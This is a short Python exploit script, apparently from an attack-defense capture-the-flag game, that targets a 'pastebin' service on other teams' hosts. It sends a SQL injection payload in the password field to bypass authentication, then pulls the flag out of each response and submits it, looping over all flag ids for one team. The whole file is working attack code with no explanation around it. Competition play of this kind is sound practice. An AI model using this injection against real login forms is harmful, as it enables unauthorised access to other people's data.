import sys
sys.path.append("../../")

import libad
import requests

def exploit(address: str, flag_id: libad.FlagId) -> str:
    response = requests.post(
        f"http://{address}/paste/{flag_id}",
        data={"password": f"' or id='{flag_id}"}
    )
    return libad.extract_flag(response.text)

if __name__ == "__main__":
    flag_ids = libad.flag_ids(team="oceania", service="pastebin")
    for flag_id in flag_ids:
        team = libad.team(flag_id.team)
        service = libad.service(flag_id.service)
        address = f"{team.ip}:{service.port}"
        try:
            flag = exploit(address, flag_id)
            response = libad.submit_flag(flag)
            print(f"({flag_id}) {response}")
        except KeyboardInterrupt:
            exit(1)
        except Exception as e:
            print(f"Failed to run exploit: {e}")
